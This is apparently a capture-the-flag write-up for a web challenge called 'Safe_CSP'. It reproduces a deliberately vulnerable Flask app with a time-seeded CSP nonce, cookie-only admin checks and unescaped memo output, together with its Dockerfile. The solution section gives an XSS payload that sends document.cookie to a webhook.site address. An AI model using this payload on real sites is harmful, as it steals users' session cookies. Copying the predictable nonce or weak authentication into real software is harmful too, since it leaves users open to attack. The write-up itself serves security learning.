# 🔐 Safe_CSP

---
## Description

**Google says this CSP is safe.**

---

## Background

**Technologies Involved:**
- CSP (Content Security Policy)
- Nonce-based Script Execution
- XSS (Cross-Site Scripting)
- Mersenne Twister Algorithm

**References:**
- [Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP) | Articles | web.dev](https://web.dev/articles/strict-csp?hl=ko)

## Code Analysis

---

### Core Flask Application

```python
from flask import Flask, request, redirect, render_template, make_response
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from Crypto.Util.number import bytes_to_long
import random
import time
import base64
import urllib

app = Flask(__name__)

# ============== Time-based Nonce Generation ==============
random.seed(time.time())  # ← Predictable seed vulnerability!
NONCE = base64.b64encode(random.getrandbits(32).to_bytes(8, 'big')).decode()

# ============== Insufficient Cookie Validation ==============
USER_DATA = {
   "admin": "[**redacted**]",  # ← Complex password but bypassable
   "user": "pass"
}

try:
   FLAG = open("./flag.txt", "r").read()  # ← Target: Extract this value
except:
   FLAG = "[**FLAG**]"

# ============== Admin Bot Execution Function ==============
def read_url(url, cookie={"name": "name", "value": "value"}):
   cookie.update({"domain": "127.0.0.1"})
   try:
       service = Service(executable_path="/usr/local/bin/chromedriver")
       options = webdriver.ChromeOptions()
       for _ in [
           "headless",
           "window-size=1920x1080", 
           "disable-gpu",
           "no-sandbox",
           "disable-dev-shm-usage",
       ]:
           options.add_argument(_)
       driver = webdriver.Chrome(service=service, options=options)
       driver.implicitly_wait(3)
       driver.set_page_load_timeout(3)
       driver.get("http://127.0.0.1:8000/")
       
       # ============== Automatic Admin Cookie Setting ==============
       driver.add_cookie({'name': 'username', 'value': 'admin'})  # ← Admin privilege
       driver.add_cookie(cookie)  # ← Additional flag cookie
       driver.get(url)  # ← Visit specified URL
   except Exception as e:
       driver.quit()
       return False
   driver.quit()
   return True

# ============== XSS Check Function ==============
def check_xss(param, cookie={"name": "name", "value": "value"}):
   # Function that makes admin bot visit memo page
   url = f"http://127.0.0.1:8000/memo?text={urllib.parse.quote(param)}"
   return read_url(url, cookie)  # ← param executed as XSS in memo

# ============== CSP Configuration (Nonce-based) ==============
@app.after_request
def add_header(response):
   global NONCE
   # ← Only scripts with correct nonce can execute
   response.headers[
       "Content-Security-Policy"
   ] = f"default-src 'self';base-uri 'none';style-src 'none';img-src *;script-src 'nonce-{NONCE}'"
   return response

@app.route('/')
def home():
   username = request.cookies.get('username')
   if username:
       return redirect('/memo')
   return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
   error = ""
   if request.method == 'POST':
       username = request.form.get('username')
       password = request.form.get('password')

       # ============== Normal Login Validation ==============
       if username in USER_DATA and USER_DATA[username] == password:
           resp = make_response(redirect('/memo'))
           resp.set_cookie('username', username)
           return resp
       else:
           error = "Invalid username or password."

   resp = make_response(render_template("login.html", error=error))
   return resp

# ============== Nonce Refresh Point ==============
@app.route('/logout', methods=['POST'])
def logout():
   global NONCE
   random.seed(time.time())  # ← Time-based seed again (predictable!)
   NONCE = base64.b64encode(random.getrandbits(32).to_bytes(8, 'big')).decode()

   resp = make_response(redirect('/login'))
   resp.delete_cookie('username')
   return resp

# ============== Insufficient Cookie Validation + XSS ==============
@app.route('/memo')
def memo():
   username = request.cookies.get('username')
   memo_text = request.args.get('text', '')
   
   # ============== Unintended Solution Point ==============
   if not username or username not in USER_DATA:  # ← No password validation!
       return redirect('/login')                   # ← Bypassable with username=admin cookie

   if username != 'admin':
       return 'You are not admin!!!'

   # ============== Material for MT State Recovery (Intended Solution) ==============
   try:
       r = random.getrandbits(32)  # ← 32-bit random from MT
       memo_bytes = memo_text.encode('utf-8')
       memo_int = bytes_to_long(memo_bytes)
       xor_result = memo_int ^ r   # ← XOR with input (reverse to recover r)
       xor_hex = hex(xor_result)   # ← Collect 623 to recover MT state
   except Exception as e:
       xor_hex = f"Conversion fail: {e}"

   # ============== XSS Vulnerability ==============
   resp = make_response(render_template("memo.html", username=username, 
                                      memo_text=memo_text,  # ← {{ memo_text | safe }} enables XSS
                                      xor_result=xor_hex))
   return resp

# ============== Admin Bot Execution with Flag Cookie ==============
@app.route('/debug')
def debug():
   global NONCE
   param = request.args.get('param', '')
   
   # Admin bot visits memo page with flag cookie
   if not check_xss(param, {'name': 'flag', 'value': FLAG.strip()}):  # ← Flag cookie set!
       return f'<script nonce={NONCE}>alert("wrong??");history.go(-1);</script>'

   return f'<script nonce={NONCE}>alert("good");history.go(-1);</script>'  # ← Current nonce exposed!

app.run(host="0.0.0.0", port=8000)
```

### Dockerfile

```docker
FROM python:3.10-slim-bookworm@sha256:66a6e8a211a02794515d4e1aa1970fc037ec4dde1429395e1321bdd63af01256

# ENV
ENV user warp
ENV port 8000

# chrome installation and setup
RUN apt-get update && apt-get install -y --no-install-recommends \
    wget curl gnupg unzip ca-certificates apt-transport-https \
    fonts-liberation libasound2 libatk1.0-0 libc6 libcairo2 libcups2 \
    libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libglib2.0-0 libgtk-3-0 \
    libnspr4 libnss3 libpango-1.0-0 libu2f-udev libx11-6 libx11-xcb1 \
    libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxi6 \
    libxrandr2 libxrender1 libxss1 libxtst6 libdrm2 libgbm1

# chromedriver setup
RUN set -eux; \
    CHROME_VERSION="$(google-chrome --version | awk '{print $3}')" ; \
    MAJOR="${CHROME_VERSION%%.*}" ; \
    LATEST="$(curl -s https://googlechromelabs.github.io/chrome-for-testing/LATEST_RELEASE_${MAJOR})" ; \
    curl -fSL "https://storage.googleapis.com/chrome-for-testing-public/${LATEST}/linux64/chromedriver-linux64.zip" -o /tmp/chromedriver.zip ; \
    unzip -q /tmp/chromedriver.zip -d /opt/chromedriver ; \
    mv /opt/chromedriver/chromedriver-linux64/chromedriver /usr/local/bin/chromedriver ; \
    chmod +x /usr/local/bin/chromedriver

# Application setup
RUN adduser $user
ADD ./deploy /app
WORKDIR /app
RUN pip3 install -r requirements.txt
RUN chown root:$user /app/flag.txt

USER $user
EXPOSE $port
ENV CHROME_BIN=/usr/bin/google-chrome
ENV CHROMEDRIVER=/usr/local/bin/chromedriver

ENTRYPOINT ["python3"]
CMD ["app.py"]
```

## Exploitation

---

### Vulnerability Analysis

**Critical Vulnerabilities:**
- Time-based nonce generation using `random.seed(time.time())` enables nonce prediction
- Insufficient cookie validation allows direct `username=admin` cookie setting (unintended)
- XSS vulnerability in memo page via `{{ memo_text | safe }}`
- Debug endpoint executes admin bot with flag cookie

**Intended vs Unintended Solution:**
- **Intended**: Mersenne Twister state recovery → nonce prediction → XSS
- **Unintended**: Cookie bypass → current nonce extraction → XSS

### Exploitation Steps

#### 1. Admin Privilege Escalation via Cookie Manipulation

#### 2. Current Nonce Value Extraction

#### 3. XSS Execution with Predicted Nonce for Flag Extraction

### Exploitation Code

** Solution **

```javascript
// Extract current nonce from browser developer tools
fetch(window.location.href).then(response => {
    console.log('CSP:', response.headers.get('Content-Security-Policy'));
});

// Set admin cookie
document.cookie = "username=admin";

// Execute XSS with extracted nonce
// URL: /debug?param=<script nonce='CURRENT_NONCE'>location.href='https://webhook.site/endpoint?cookie='+document.cookie</script>
```

## Key Takeaways

---

**Technical Insights:**
- **Unintended Solution**: Exploiting insufficient authentication logic without complex cryptographic attacks
- **CSP Nonce Prediction**: Understanding the dangers of time-based seeds and Mersenne Twister vulnerabilities
- **XSS + Admin Bot**: Leveraging Selenium-based automated XSS validation bypass techniques
- **Timing Attacks**: Real-time exploitation in environments with dynamic nonce generation

**Security Lessons:**
- Never use predictable seeds for security-critical random generation
- Implement proper authentication validation beyond cookie presence checks
- CSP nonce values should use cryptographically secure random generators
- Admin bots can become attack vectors when combined with XSS vulnerabilities

**Attack Complexity:**
- **Intended Solution**: High complexity (Mersenne Twister cryptanalysis)
- **Unintended Solution**: Low complexity (simple cookie manipulation)
- **Real-world Impact**: Both approaches lead to full flag extraction
